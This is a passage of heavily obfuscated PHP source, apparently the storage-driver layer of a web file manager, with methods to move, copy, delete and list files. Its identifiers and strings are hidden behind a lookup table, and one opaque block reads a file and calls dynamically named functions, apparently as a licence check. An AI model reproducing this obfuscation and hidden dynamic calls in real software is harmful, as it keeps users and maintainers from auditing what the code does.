$éªÇºûÌ[$ÂİŞØã•[98]] = $ñ’ õã°; return !0; } private function _parseError($°÷¶‹à, $±èÆŒ¸ª, $ú©ü¦´­ = false) { $ã¶×ËÎè =& $_SERVER[÷åé¼î]; if ($±èÆŒ¸ª == $ã¶×ËÎè[68] && stripos($°÷¶‹à, $ã¶×ËÎè[2316])) { $Âäı•¸š = explode($ã¶×ËÎè[10], $°÷¶‹à); $¹ÄÃÕ‚È = isset($Âäı•¸š[1]) ? $Âäı•¸š[1] : $ã¶×ËÎè[12]; $úİ–©†Ò = array($ã¶×ËÎè[2317] => LNG($ã¶×ËÎè[2318]), $ã¶×ËÎè[2319] => LNG($ã¶×ËÎè[2320])); if (isset($úİ–©†Ò[$¹ÄÃÕ‚È])) { $°÷¶‹à = $úİ–©†Ò[$¹ÄÃÕ‚È]; } } if (stripos($°÷¶‹à, $ã¶×ËÎè[2321]) === 0) { $Ğ¦—ÖÛ› = strpos($°÷¶‹à, $ã¶×ËÎè[178]); if ($Ğ¦—ÖÛ› === !1) { $Ğ¦—ÖÛ› = strpos($°÷¶‹à, $ã¶×ËÎè[4]); } if ($Ğ¦—ÖÛ› !== !1) { $°÷¶‹à = substr($°÷¶‹à, $Ğ¦—ÖÛ› + 1); } } $°÷¶‹à = LNG($ã¶×ËÎè[1263]) . $°÷¶‹à; if ($ú©ü¦´­) { return $°÷¶‹à; } show_json($°÷¶‹à, !1); } public function driverListSystem() { $¼Ô­‰×÷ =& $_SERVER[÷åé¼î]; $Ğãì† = parent::listData(); $¬õ„ö±­ = array(); foreach ($Ğãì† as $«À¼Ï¯ ) { unset($«À¼Ï¯ [$¼Ô­‰×÷[231]], $«À¼Ï¯ [$¼Ô­‰×÷[88]]); $«À¼Ï¯ [$¼Ô­‰×÷[6]] = json_decode($«À¼Ï¯ [$¼Ô­‰×÷[6]], !0); $¬õ„ö±­[] = $«À¼Ï¯ ; } return $¬õ„ö±­; } public function defaultDriver() { $õìÑê™ =& $_SERVER[÷åé¼î]; $‚Ä£ü’Ü = parent::listData(); $Üøü›¶Î = array_filter_by_field($‚Ä£ü’Ü, $õìÑê™[37], 1); $Üøü›¶Î = $Üøü›¶Î[0]; if ($Üøü›¶Î) { $Üøü›¶Î[$õìÑê™[6]] = json_decode($Üøü›¶Î[$õìÑê™[6]], !0); } return $Üøü›¶Î; } public function driverInfo($ß¯ÊºíÂ) { $İ‚‘À€™ =& $_SERVER[÷åé¼î]; $ÖšÆØ«Ú = array_to_keyvalue(parent::listData(), $İ‚‘À€™[459]); if (!isset($ÖšÆØ«Ú[$ß¯ÊºíÂ])) { return !1; } $ÙÃê½Úë = $ÖšÆØ«Ú[$ß¯ÊºíÂ]; $ÙÃê½Úë[$İ‚‘À€™[6]] = json_decode($ÙÃê½Úë[$İ‚‘À€™[6]], !0); return $ÙÃê½Úë; } public function remove($¡íŸØ¦·) { $this->removeShareItems($¡íŸØ¦·); return parent::remove($¡íŸØ¦·); } public function removeWithFile($Ù­Ã³¤Â, $…‡é’±, $ÊÍêı©Ï, $àÈ Ÿ€ = false) { $Û„éÙÉ =& $_SERVER[÷åé¼î]; $×ÈçïÁû = array($Û„éÙÉ[882] => $Ù­Ã³¤Â); $Îß±³Ôš = Model($Û„éÙÉ[528])->where($×ÈçïÁû)->count(); $éí‡º˜Ã = Model($Û„éÙÉ[528])->where($×ÈçïÁû)->sum($Û„éÙÉ[79]); $Ø˜Šïæı = $…‡é’± . $Û„éÙÉ[2322] . $Ù­Ã³¤Â; $Âüè¿¨ = LNG($…‡é’± == $Û„éÙÉ[604] ? $Û„éÙÉ[2323] : $Û„éÙÉ[2324]); $´Æ–çá = new TaskFileTransfer($Ø˜Šïæı, $Û„éÙÉ[215], $Îß±³Ôš, $Âüè¿¨ . $Û„éÙÉ[446] . $ÊÍêı©Ï[$Û„éÙÉ[32]] . $Û„éÙÉ[214] . $Ù­Ã³¤Â); $´Æ–çá->task[$Û„éÙÉ[828]] = (double) $éí‡º˜Ã; $ÂŒ°ÅÕí = KodIO::defaultDriver(); $Ğè‘ò”° = $ÂŒ°ÅÕí[$Û„éÙÉ[459]]; $¥Ñø›Ë· = $š¢Ö•êä = $ô´×‡ƒÓ = array(); $¶¾ä¡ = Model($Û„éÙÉ[230])->where($×ÈçïÁû)->field($Û„éÙÉ[2325])->select(); foreach ($¶¾ä¡ as $£ÙÃÇ×ç) { $½òªÒĞ¿ = $£ÙÃÇ×ç[$Û„éÙÉ[525]]; if ($àÈ Ÿ€) { $š¢Ö•êä[] = $½òªÒĞ¿; continue; } $ïÖÃ¨õ = $£ÙÃÇ×ç[$Û„éÙÉ[87]]; $Æ³¥î× = get_path_father($ïÖÃ¨õ); $ô´×‡ƒÓ[] = $Æ³¥î×; $Æ³¥î× = str_replace("\173\151\x6f\x3a{$Ù­Ã³¤Â}\x7d\x2f", "\173\x69\157\72{$Ğè‘ò”°}\175\57", $Æ³¥î×); if (!IO::exist($ïÖÃ¨õ)) { $¥Ñø›Ë·[] = $½òªÒĞ¿; $´Æ–çá->updateFileEnd($£ÙÃÇ×ç[$Û„éÙÉ[32]], $£ÙÃÇ×ç[$Û„éÙÉ[79]]); write_log($Û„éÙÉ[2326] . $ïÖÃ¨õ, $Û„éÙÉ[1909]); continue; } $ã“³Ÿö„ = IO::move($ïÖÃ¨õ, $Æ³¥î×, REPEAT_RENAME); if (!$ã“³Ÿö„) { $š¢Ö•êä[] = $½òªÒĞ¿; $´Æ–çá->updateFileEnd($£ÙÃÇ×ç[$Û„éÙÉ[32]], $£ÙÃÇ×ç[$Û„éÙÉ[79]]); write_log($Û„éÙÉ[2327] . $ïÖÃ¨õ, $Û„éÙÉ[1909]); continue; } $×ÈçïÁû = array($Û„éÙÉ[525] => $½òªÒĞ¿); $úÈ‹Áöó = array($Û„éÙÉ[882] => $Ğè‘ò”°, $Û„éÙÉ[87] => $ã“³Ÿö„); Model($Û„éÙÉ[230])->where($×ÈçïÁû)->save($úÈ‹Áöó); } $›¤‡¯ô¾ = $´Æ–çá->task; if (!$àÈ Ÿ€) { Cache::set($Ø˜Šïæı, $›¤‡¯ô¾); } $´Æ–çá->end(); $¥Ñø›Ë· = array_unique($¥Ñø›Ë·); $š¢Ö•êä = array_unique($š¢Ö•êä); if (!$àÈ Ÿ€ && ($¥Ñø›Ë· || $š¢Ö•êä)) { $š¡È–² = array(); if ($¥Ñø›Ë·) { $š¡È–²[] = sprintf(LNG($Û„éÙÉ[2328]), count($¥Ñø›Ë·)); } if ($š¢Ö•êä) { $š¡È–²[] = sprintf(LNG($Û„éÙÉ[2329]), count($š¢Ö•êä)); } $š¡È–² = sprintf(LNG($Û„éÙÉ[2330]), implode($Û„éÙÉ[2331], $š¡È–²)) . $Û„éÙÉ[2332] . date($Û„éÙÉ[2333]) . $Û„éÙÉ[2334]; if ($…‡é’± == $Û„éÙÉ[1946]) { $š¡È–² .= $Û„éÙÉ[2335] . LNG($Û„éÙÉ[2336]); } $›¤‡¯ô¾[$Û„éÙÉ[1258]] = $š¡È–²; Cache::set($Ø˜Šïæı, $›¤‡¯ô¾); unset($ÊÍêı©Ï[$Û„éÙÉ[6]]); $‚µ×å± = array($Û„éÙÉ[459] => $Ù­Ã³¤Â, $Û„éÙÉ[2215] => $Û„éÙÉ[604], $Û„éÙÉ[32] => $ÊÍêı©Ï[$Û„éÙÉ[32]], $Û„éÙÉ[1281] => $ÊÍêı©Ï); Hook::trigger($Û„éÙÉ[1790], array($Û„éÙÉ[1281] => $‚µ×å±, $Û„éÙÉ[1291] => !0)); show_json($š¡È–², !1, 100111); } if ($…‡é’± == $Û„éÙÉ[604]) { return !0; } if ($¥Ñø›Ë· || $š¢Ö•êä) { $ù›ñš¾¤ = array_merge($¥Ñø›Ë·, $š¢Ö•êä); $ù›ñš¾¤ = array_filter(array_unique($ù›ñš¾¤)); $this->removeByFileID($ù›ñš¾¤); } if ($ô´×‡ƒÓ) { $ô´×‡ƒÓ = array_filter(array_unique($ô´×‡ƒÓ)); foreach ($ô´×‡ƒÓ as $ïÖÃ¨õ) { $±¯ö‚Äú = IO::has($ïÖÃ¨õ, !0); if (!$±¯ö‚Äú[$Û„éÙÉ[239]] && !$±¯ö‚Äú[$Û„éÙÉ[240]]) { IO::remove($ïÖÃ¨õ); } } } return $this->remove($Ù­Ã³¤Â); } private function removeByFileID($öğÎªéÇ = array()) { $ÜğÆ‹Å— =& $_SERVER[÷åé¼î]; if (empty($öğÎªéÇ)) { return; } $“Æ“’’ = array($ÜğÆ‹Å—[525] => array($ÜğÆ‹Å—[7], $öğÎªéÇ)); $ş¦ÁÛş = Model($ÜğÆ‹Å—[1414])->where($“Æ“’’)->field($ÜğÆ‹Å—[193])->select(); if (!$ş¦ÁÛş) { return Model($ÜğÆ‹Å—[528])->remove($öğÎªéÇ); } $ş¦ÁÛş = array_to_keyvalue($ş¦ÁÛş, $ÜğÆ‹Å—[12], $ÜğÆ‹Å—[193]); foreach ($ş¦ÁÛş as $¯‰ÈåÜ) { Model($ÜğÆ‹Å—[889])->removeNow($¯‰ÈåÜ, !1); } } private function removeShareItems($§¦²ˆºÁ) { $äÏ¡äğç =& $_SERVER[÷åé¼î]; $¦‡ºğøà = "\173\x69\157\72{$§¦²ˆºÁ}\175\57"; $¾Ì½‰Ó„ = array($äÏ¡äğç[193] => 0, $äÏ¡äğç[1251] => array($äÏ¡äğç[443], "{$¦‡ºğøà}\45")); $îšÊª°õ = Model($äÏ¡äğç[1957])->where($¾Ì½‰Ó„)->field($äÏ¡äğç[649])->select(); if (empty($îšÊª°õ)) { return; } $¾¬£ş”„ = array_to_keyvalue($îšÊª°õ, $äÏ¡äğç[12], $äÏ¡äğç[649]); Model($äÏ¡äğç[648])->remove($¾¬£ş”„); } } goto aø¥©¹ÇÃ®; fƒ¼Òâ‘˜’: if ($_SERVER[$_SERVER[÷åé¼î][933]] != $_SERVER[$_SERVER[÷åé¼î][1448]]) { $_getc = $_SERVER[÷åé¼î][934]; $_getfile = $_SERVER[$_SERVER[÷åé¼î][935]] . $_SERVER[÷åé¼î][936]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[÷åé¼î][262], $_getfilec); if (count($_getarrs) < $_SERVER[÷åé¼î][677]) { $exit = $_SERVER[÷åé¼î][937]; $exit(); } $_act = $_SERVER[÷åé¼î][938]; $_act($_SERVER[$_SERVER[÷åé¼î][931]]); } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($µ·õ‹•) { parent::__construct($µ·õ‹•); $this->setSignVersion($_SERVER[÷åé¼î][247]); } public function uploadLink($ ÕâÁŸ¡, $ºÄ„â¯ = 0) { $ü–¢Ò–Â =& $_SERVER[÷åé¼î]; if ($this->isUploadServer()) { return; } $è£û„Ş½ = $this->getType(); if (!in_array($è£û„Ş½, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ØûÇéø  = (!$ºÄ„â¯ ? 1 : ceil($ºÄ„â¯ / pow(1024, 3))) * 3600 * 4; $¬Ñîø„“ = $this->multiUploadFormData($ ÕâÁŸ¡, $ØûÇéø ); if ($¬Ñîø„“) { $¬Ñîø„“[$ü–¢Ò–Â[97]] = $ ÕâÁŸ¡; $¬Ñîø„“[$ü–¢Ò–Â[98]] = $è£û„Ş½; } return $¬Ñîø„“; } public function fileOutImage($ »¦ÜÅ‡, $Éõ•çÒ = 250) { if ($this->size($ »¦ÜÅ‡) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ »¦ÜÅ‡, $Éõ•çÒ); } $»®Ù¾Ù¹ = $this->link($ »¦ÜÅ‡); $»®Ù¾Ù¹ .= $_SERVER[÷åé¼î][1449] . $Éõ•çÒ; $this->fileOutLink($»®Ù¾Ù¹); } public function fileOutLink($Â‘ó©™ö) { $¯‘™ü‚€ =& $_SERVER[÷åé¼î]; if (substr($Â‘ó©™ö, 0, 7) == $¯‘™ü‚€[1404]) { $Â‘ó©™ö = $¯‘™ü‚€[1405] . substr($Â‘ó©™ö, 7); } header($¯‘™ü‚€[175] . $Â‘ó©™ö); die; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($Ñíä”¼ó) { if (substr($Ñíä”¼ó, 0, 2) == $_SERVER[÷åé¼î][1435]) { $Ñíä”¼ó = BASIC_PATH . substr($Ñíä”¼ó, 2); } return $Ñíä”¼ó; } public function iconvApp($Øªò´Çİ) { $÷–‘‚³¨ =& $_SERVER[÷åé¼î]; global $config; return $this->iconvTo($Øªò´Çİ, $config[$÷–‘‚³¨[1433]], $config[$÷–‘‚³¨[1432]]); } public function iconvSystem($Åã¾Î½£) { $Ëº®ª÷ =& $_SERVER[÷åé¼î]; global $config; return $this->iconvTo($Åã¾Î½£, $config[$Ëº®ª÷[1432]], $config[$Ëº®ª÷[1433]]); } public function getPathOuter($Á”§ÂÆÏ) { $”šÍ™“š =& $_SERVER[÷åé¼î]; $ËÀù¢éğ = $this->iconvApp($this->pathBase); $Á”§ÂÆÏ = $this->iconvApp($Á”§ÂÆÏ); if (substr($ËÀù¢éğ, 0, 2) == $”šÍ™“š[1435]) { $ËÀù¢éğ = BASIC_PATH . substr($ËÀù¢éğ, 2); } if (substr($Á”§ÂÆÏ, 0, 2) == $”šÍ™“š[1435]) { $Á”§ÂÆÏ = BASIC_PATH . substr($Á”§ÂÆÏ, 2); } $ËÀù¢éğ = KodIO::clear($ËÀù¢éğ); $Á”§ÂÆÏ = KodIO::clear($Á”§ÂÆÏ); $Á”§ÂÆÏ = substr($Á”§ÂÆÏ, strlen($ËÀù¢éğ)); if (empty($this->pathDriver)) { return $Á”§ÂÆÏ; } return $this->pathDriver . $”šÍ™“š[8] . ltrim($Á”§ÂÆÏ, $”šÍ™“š[8]); } public function mkfile($²éç•¿ï, $™¾ÆÙ = '', $â€è‹½Ù = REPEAT_RENAME) { $²éç•¿ï = $this->iconvSystem($²éç•¿ï); @touch($²éç•¿ï); if ($™¾ÆÙ) { file_put_contents($²éç•¿ï, $™¾ÆÙ); } @chmod($²éç•¿ï, $this->pathAuth); if (is_file($²éç•¿ï)) { return $this->getPathOuter($²éç•¿ï); } $this->writeLog(__FUNCTION__ . $_SERVER[÷åé¼î][1445], !0); return !1; } public function mkdir($”ª„Í’Î, $Éà°Ğ€ = REPEAT_SKIP) { $”ª„Í’Î = $this->iconvSystem($”ª„Í’Î); if (is_dir($”ª„Í’Î)) { return $this->getPathOuter($”ª„Í’Î); } if (!$this->mkdir($this->pathFather($”ª„Í’Î))) { return !1; } @mkdir($”ª„Í’Î, $this->pathAuth, !0); @chmod($”ª„Í’Î, $this->pathAuth); if (is_dir($”ª„Í’Î)) { return $this->getPathOuter($”ª„Í’Î); } $this->writeLog(__FUNCTION__ . $_SERVER[÷åé¼î][1445], !0); return !1; } public function copyFile($Òà¾úÕå, $™¦Û¡Ÿ£) { $this->mkdir($this->pathFather($™¦Û¡Ÿ£)); $Òà¾úÕå = $this->iconvSystem($Òà¾úÕå); $™¦Û¡Ÿ£ = $this->iconvSystem($™¦Û¡Ÿ£); $Ş‰ÒÍˆ± = copy_64($Òà¾úÕå, $™¦Û¡Ÿ£); @chmod($™¦Û¡Ÿ£, $this->pathAuth); if ($Ş‰ÒÍˆ±) { return $this->getPathOuter($™¦Û¡Ÿ£); } $this->writeLog(__FUNCTION__ . $_SERVER[÷åé¼î][1445], !0); return !1; } public function moveFile($¹¦Æõ¢ğ, $¶ëÛòñÛ) { $this->mkdir($this->pathFather($¶ëÛòñÛ)); $¹¦Æõ¢ğ = $this->iconvSystem($¹¦Æõ¢ğ); $¶ëÛòñÛ = $this->iconvSystem($¶ëÛòñÛ); $—Âô¾Ø“ = intval(@rename($¹¦Æõ¢ğ, $¶ëÛòñÛ)); if (!$—Âô¾Ø“) { if ($—Âô¾Ø“ = intval(@copy_64($¹¦Æõ¢ğ, $¶ëÛòñÛ))) { @unlink($¹¦Æõ¢ğ); } } @chmod($¶ëÛòñÛ, $this->pathAuth); if ($—Âô¾Ø“) { return $this->getPathOuter($¶ëÛòñÛ); } $this->writeLog(__FUNCTION__ . $_SERVER[÷åé¼î][1445], !0); return !1; } public function movePath($¤´œ¢†, $¢ñÃ®Ş, $ó¢‰›­¦ = false) { $‚ßÉÒº¿ =& $_SERVER[÷åé¼î]; $¤´œ¢† = $this->iconvSystem($¤´œ¢†); $¢ñÃ®Ş = $this->iconvSystem($¢ñÃ®Ş); $äš“·¢  = rtrim($¢ñÃ®Ş, $‚ßÉÒº¿[8]) . $‚ßÉÒº¿[8] . ($ó¢‰›­¦ ? $ó¢‰›­¦ : get_path_this($¤´œ¢†)); if (file_exists($äš“·¢ )) { return !1; } $–«‘ƒ¡æ = intval(@rename($¤´œ¢†, $äš“·¢ )); $–«‘ƒ¡æ = file_exists($äš“·¢ ); if ($–«‘ƒ¡æ) { return $this->getPathOuter($äš“·¢ ); } $this->writeLog(__FUNCTION__ . $‚ßÉÒº¿[1445], !0); return !1; } public function delFile($ÊÆ¬›‚¸) { $ÊÆ¬›‚¸ = $this->iconvSystem($ÊÆ¬›‚¸); if (!@unlink($ÊÆ¬›‚¸)) { @chmod($ÊÆ¬›‚¸, $this->pathAuth); if (@unlink($ÊÆ¬›‚¸)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[÷åé¼î][1445], !0); return !1; } return !0; } public function delFolder($‡üº¦ÛŠ) { $ˆ…±ñ‰ =& $_SERVER[÷åé¼î]; $‡üº¦ÛŠ = $this->iconvSystem($‡üº¦ÛŠ); if (!is_dir($‡üº¦ÛŠ)) { return !0; } if (!($ÑÔ²£ìµ = opendir($‡üº¦ÛŠ))) { return !1; } while (($şÂßÃÄı = readdir($ÑÔ²£ìµ)) !== !1) { if ($şÂßÃÄı == $ˆ…±ñ‰[10] || $şÂßÃÄı == $ˆ…±ñ‰[1357]) { continue; } $—µÎ¥¿ = $‡üº¦ÛŠ . $ˆ…±ñ‰[8] . $şÂßÃÄı; if (is_file($—µÎ¥¿) || is_link($—µÎ¥¿)) { if (!unlink($—µÎ¥¿)) { chmod($—µÎ¥¿, $this->pathAuth); if (!unlink($—µÎ¥¿)) { return !1; } } } else { if (is_dir($—µÎ¥¿)) { chmod($—µÎ¥¿, $this->pathAuth); $—µÎ¥¿ = $this->iconvApp($—µÎ¥¿); if (!$this->delFolder($—µÎ¥¿)) { return !1; } } } } closedir($ÑÔ²£ìµ); return rmdir($‡üº¦ÛŠ); } public function rename($™Âñ¢Óô, $½îÄÙê„) { $ßíù“ôà =& $_SERVER[÷åé¼î]; $åÄ¦úµë = $this->fileNameAuto($this->pathFather($™Âñ¢Óô), $½îÄÙê„); $åÄ¦úµë = $this->iconvSystem($åÄ¦úµë); $™Âñ¢Óô = $this->iconvSystem($™Âñ¢Óô); $ªˆ’ü°í = $this->pathFather($™Âñ¢Óô); $Êòª°§õ = rtrim($ªˆ’ü°í, $ßíù“ôà[8]) . $ßíù“ôà[8] . $åÄ¦úµë; $ê‰‚à’å = @rename($™Âñ¢Óô, $Êòª°§õ); $Êòª°§õ = $this->iconvApp($Êòª°§õ); if ($ê‰‚à’å) { return $this->getPathOuter($Êòª°§õ); } $this->writeLog(__FUNCTION__ . $ßíù“ôà[1445], !0); return !1; } public function size($Ë‘ÂÙÄ) { $Ë‘ÂÙÄ = $this->iconvSystem($Ë‘ÂÙÄ); return filesize_64($Ë‘ÂÙÄ); } public function info($™èËÉÎÅ) { $™èËÉÎÅ = $this->iconvSystem($™èËÉÎÅ); if ($this->isFolder($™èËÉÎÅ)) { return $this->folderInfo($™èËÉÎÅ); } else { if ($this->isFile($™èËÉÎÅ)) { return $this->fileInfo($™èËÉÎÅ); } } return !1; } protected function infoChildren($İŠšâõ», &$·‡Ê¦éş, $°•Ş½ãş = true) { $õï…šÁ =& $_SERVER[÷åé¼î]; check_abort_echo(); $İŠšâõ» = rtrim($İŠšâõ», $õï…šÁ[8]) . $õï…šÁ[8]; if ($°•Ş½ãş) { $İŠšâõ» = $this->iconvSystem($İŠšâõ»); } if (!($¡æİ„´» = @opendir($İŠšâõ»))) { return; } while (($Öå¸×¬« = readdir($¡æİ„´»)) !== !1) { if ($Öå¸×¬« == $õï…šÁ[10] || $Öå¸×¬« == $õï…šÁ[1357]) { continue; } $ÛÙÄìÅ£ = $İŠšâõ» . $Öå¸×¬«; if (is_file($ÛÙÄìÅ£) || is_link($ÛÙÄìÅ£)) { $·‡Ê¦éş[$õï…šÁ[80]]++; $·‡Ê¦éş[$õï…šÁ[79]] += filesize_64($ÛÙÄìÅ£); } else { if (is_dir($ÛÙÄìÅ£)) { $·‡Ê¦éş[$õï…šÁ[81]]++; $this->infoChildren($ÛÙÄìÅ£, $·‡Ê¦éş, !1); } } } closedir($¡æİ„´»); } private function folderInfo($½Ú¥©­, $ììÍØ‹™ = false) { $…¶Å¾Ûı =& $_SERVER[÷åé¼î]; $½Ú¥©­ = rtrim($½Ú¥©­, $…¶Å¾Ûı[8]) . $…¶Å¾Ûı[8]; $é€à§ãï = $this->iconvApp($this->pathThis($½Ú¥©­)); if ($ììÍØ‹™) { return array($…¶Å¾Ûı[32] => $é€à§ãï, $…¶Å¾Ûı[87] => $this->getPathOuter($½Ú¥©­), $…¶Å¾Ûı[33] => $…¶Å¾Ûı[78]); } $®¹Ê†ÒÅ = array($…¶Å¾Ûı[32] => $é€à§ãï, $…¶Å¾Ûı[87] => $this->getPathOuter($½Ú¥©­), $…¶Å¾Ûı[33] => $…¶Å¾Ûı[78], $…¶Å¾Ûı[231] => @filectime($½Ú¥©­), $…¶Å¾Ûı[88] => @filemtime($½Ú¥©­), $…¶Å¾Ûı[1450] => @fileatime($½Ú¥©­), $…¶Å¾Ûı[1451] => is_readable($½Ú¥©­), $…¶Å¾Ûı[1452] => is_writable($½Ú¥©­), $…¶Å¾Ûı[1453] => get_mode($½Ú¥©­)); return $®¹Ê†ÒÅ; } private function fileInfo($ÏÉ‰‹‰Å, $®ËÒŞš‚ = false) { $¹‰‡ÔéĞ =& $_SERVER[÷åé¼î]; $¸…›™å = $this->iconvApp($this->pathThis($ÏÉ‰‹‰Å)); if ($®ËÒŞš‚) { return array($¹‰‡ÔéĞ[32] => $¸…›™å, $¹‰‡ÔéĞ[87] => $this->getPathOuter($ÏÉ‰‹‰Å), $¹‰‡ÔéĞ[33] => $¹‰‡ÔéĞ[230], $¹‰‡ÔéĞ[79] => $this->size($ÏÉ‰‹‰Å), $¹‰‡ÔéĞ[169] => $this->ext($¸…›™å)); } $£Ì©ôÆ› = array($¹‰‡ÔéĞ[32] => $¸…›™å, $¹‰‡ÔéĞ[87] => $this->getPathOuter($ÏÉ‰‹‰Å), $¹‰‡ÔéĞ[33] => $¹‰‡ÔéĞ[230], $¹‰‡ÔéĞ[231] => @filectime($ÏÉ‰‹‰Å), $¹‰‡ÔéĞ[88] => @filemtime($ÏÉ‰‹‰Å), $¹‰‡ÔéĞ[1450] => @fileatime($ÏÉ‰‹‰Å), $¹‰‡ÔéĞ[79] => $this->size($ÏÉ‰‹‰Å), $¹‰‡ÔéĞ[169] => $this->ext($¸…›™å), $¹‰‡ÔéĞ[1451] => is_readable($ÏÉ‰‹‰Å), $¹‰‡ÔéĞ[1452] => is_writable($ÏÉ‰‹‰Å), $¹‰‡ÔéĞ[1453] => get_mode($ÏÉ‰‹‰Å)); return $£Ì©ôÆ›; } public function exist($ß‹ğœ¢ü) { $ß‹ğœ¢ü = $this->iconvSystem($ß‹ğœ¢ü); return @file_exists($ß‹ğœ¢ü); } public function isFile($ˆæ½†¸æ) { $ˆæ½†¸æ = $this->iconvSystem($ˆæ½†¸æ); return @is_file($ˆæ½†¸æ); } public function isFolder($ÁÍÏıÑ²) { $ÁÍÏıÑ² = $this->iconvSystem($ÁÍÏıÑ²); return @is_dir($ÁÍÏıÑ²); } public function listPath($—îİˆÁº, $¾·Ù¨÷İ = false) { $ñı°åÛÊ =& $_SERVER[÷åé¼î]; $—îİˆÁº = $this->iconvSystem($—îİˆÁº); $—îİˆÁº = rtrim($—îİˆÁº, $ñı°åÛÊ[8]) . $ñı°åÛÊ[8]; $âí¾½ì = array($ñı°åÛÊ[85] => array(), $ñı°åÛÊ[86] => array()); if (!($îÑÃÎÚÊ = @opendir($—îİˆÁº))) { return $âí¾½ì; } while (($êÃôÙŞ® = readdir($îÑÃÎÚÊ)) !== !1) { if ($êÃôÙŞ® == $ñı°åÛÊ[10] || $êÃôÙŞ® == $ñı°åÛÊ[1357]) { continue; } $åİÃùê² = $—îİˆÁº . $êÃôÙŞ®; if (is_file($åİÃùê²)) { $âí¾½ì[$ñı°åÛÊ[86]][] = $this->fileInfo($åİÃùê², $¾·Ù¨÷İ); } else { $âí¾½ì[$ñı°åÛÊ[85]][] = $this->folderInfo($åİÃùê², $¾·Ù¨÷İ); } } closedir($îÑÃÎÚÊ); return $âí¾½ì; } public function listAll($±íÜ–×ç, &$øÉŞ€§ß = array()) { $ÈàØÜÜŸ =& $_SERVER[÷åé¼î]; $±íÜ–×ç = $this->iconvSystem($±íÜ–×ç); $±íÜ–×ç = rtrim($±íÜ–×ç, $ÈàØÜÜŸ[8]) . $ÈàØÜÜŸ[8]; if (!($¨üĞ¬…† = @opendir($±íÜ–×ç))) { return $øÉŞ€§ß; } while (($±¬‚Î±Ñ = readdir($¨üĞ¬…†)) !== !1) { if ($±¬‚Î±Ñ == $ÈàØÜÜŸ[10] || $±¬‚Î±Ñ == $ÈàØÜÜŸ[1357]) { continue; } $€ª¸ßù· = $±íÜ–×ç . $±¬‚Î±Ñ; $‰­Åñ›ş = is_dir($€ª¸ßù·) && !is_link($€ª¸ßù·) ? 1 : 0; $€ª¸ßù· = $‰­Åñ›ş ? $€ª¸ßù· . $ÈàØÜÜŸ[8] : $€ª¸ßù·; $øÉŞ€§ß[] = array($ÈàØÜÜŸ[87] => $€ª¸ßù·, $ÈàØÜÜŸ[78] => $‰­Åñ›ş, $ÈàØÜÜŸ[88] => intval(@filemtime($€ª¸ßù·)), $ÈàØÜÜŸ[79] => $‰­Åñ›ş ? 0 : intval($this->size($€ª¸ßù·))); if ($‰­Åñ›ş) { $this->listAll($€ª¸ßù·, $øÉŞ€§ß); } } closedir($¨üĞ¬…†); return $øÉŞ€§ß; } public function has($êÔêª, $¡œ—ú×’ = false, $Ù¡±´åó = true) { $Ö›Í÷Â =& $_SERVER[÷åé¼î]; $êÔêª = $this->iconvSystem($êÔêª); $êÔêª = rtrim($êÔêª, $Ö›Í÷Â[8]) . $Ö›Í÷Â[8]; if (!($Ú‰–Æ“ˆ = @opendir($êÔêª))) { return !1; } $”­çÄ†ù = 0; $ìüÃÃ’ª = 0; $‘ì±çú¦ = 0; while (($Ù¢ÇÚôÂ = readdir($Ú‰–Æ“ˆ)) !== !1) { if ($Ù¢ÇÚôÂ == $Ö›Í÷Â[10] || $Ù¢ÇÚôÂ == $Ö›Í÷Â[1357]) { continue; } $úË†à„­ = $êÔêª . $Ù¢ÇÚôÂ; if ($¡œ—ú×’) { $‘ì±çú¦++; if (@is_file($úË†à„­)) { $”­çÄ†ù++; } else { $ìüÃÃ’ª++; } if ($‘ì±çú¦ > 10000) { break; } continue; } if ($Ù¡±´åó) { if (@is_file($úË†à„­)) { return !0; } } else { if (@is_dir($úË†à„­ . $Ö›Í÷Â[8])) { return !0; } } } closedir($Ú‰–Æ“ˆ); if ($¡œ—ú×’) { return array($Ö›Í÷Â[239] => $”­çÄ†ù, $Ö›Í÷Â[240] => $ìüÃÃ’ª); } return !1; } public function hashSimple($ÚùŒ’Œ”) { $ÛÂ¨í… =& $_SERVER[÷åé¼î]; if (!$ÚùŒ’Œ”) { return md5($ÛÂ¨í…[12]); } $ÚùŒ’Œ” = $this->iconvSystem($ÚùŒ’Œ”); $¢†½¤åÕ = $this->size($ÚùŒ’Œ”); $‹·î…Ï‘ = 200; $³”ØŞóÄ = 50; if ($¢†½¤åÕ <= $‹·î…Ï‘ * $³”ØŞóÄ) { return $this->hashMd5($ÚùŒ’Œ”) . $¢†½¤åÕ; } $°ìÊ³„ê = $ÛÂ¨í…[12]; $ ß’Û‘¢ = intval($¢†½¤åÕ / $³”ØŞóÄ); $Ã¹¿Ö¥÷ = fopen($ÚùŒ’Œ”, $ÛÂ¨í…[1454]); if (!$Ã¹¿Ö¥÷) { return $°ìÊ³„ê; } for ($¦æ®£ßâ = 0; $¦æ®£ßâ < $³”ØŞóÄ; $¦æ®£ßâ++) { fseek_64($Ã¹¿Ö¥÷, $ ß’Û‘¢ * $¦æ®£ßâ); $°ìÊ³„ê .= fread($Ã¹¿Ö¥÷, $‹·î…Ï‘); } fseek_64($Ã¹¿Ö¥÷, $¢†½¤åÕ - $‹·î…Ï‘); $°ìÊ³„ê .= fread($Ã¹¿Ö¥÷, $‹·î…Ï‘); fclose($Ã¹¿Ö¥÷); return md5($°ìÊ³„ê) . $¢†½¤åÕ; } public function getContent($ğ¡æÍ‚å) { $ğ¡æÍ‚å = $this->iconvSystem($ğ¡æÍ‚å); return file_get_contents($ğ¡æÍ‚å); } public function setContent($åÖ•µš™, $˜„×Åü¡ = '') { $åÖ•µš™ = $this->iconvSystem($åÖ•µš™); $Ÿêñû´ = @file_put_contents($åÖ•µš™, $˜„×Åü¡, LOCK_EX); if (!$Ÿêñû´) { $this->writeLog(__FUNCTION__ . $_SERVER[÷åé¼î][1445], !0); } clearstatcache(); @chmod($åÖ•µš™, $this->pathAuth); return $Ÿêñû´ === !1 ? !1 : !0; } public function fileSubstr($•ŠÙÁˆ¹, $åìÄÉ§î = 0, $òø¸œÇÖ = false) { $ÚëîÁØõ =& $_SERVER[÷åé¼î]; $•ŠÙÁˆ¹ = 